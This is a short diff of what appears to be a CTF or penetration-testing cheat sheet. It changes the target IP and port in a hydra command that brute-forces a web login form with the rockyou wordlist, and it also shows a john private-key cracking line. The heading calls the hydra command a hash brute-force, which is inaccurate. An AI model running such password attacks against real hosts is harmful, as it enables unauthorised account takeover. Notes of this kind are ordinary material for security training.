@@ -144,7 +144,7 @@ john --wordlist=[PATH/TO/WORDLIST] [PRIVATE KEY FILE]
 ## To Bruteforce a Hash  
 
   ```
-  hydra -L ./wordlist -P /usr/share/wordlists/rockyou.txt 138.68.180.98:31314 http-post-form "/login:username=^USER^&password=^PASS^:S=964430b4cdd199af19b986eaf2193b21f32542d0" -vV -f  
+  hydra -L ./wordlist -P /usr/share/wordlists/rockyou.txt 104.154.142.159:5454 http-post-form "/login:username=^USER^&password=^PASS^:S=964430b4cdd199af19b986eaf2193b21f32542d0" -vV -f  
   ```
 
 ## To bruteforce a popup login  
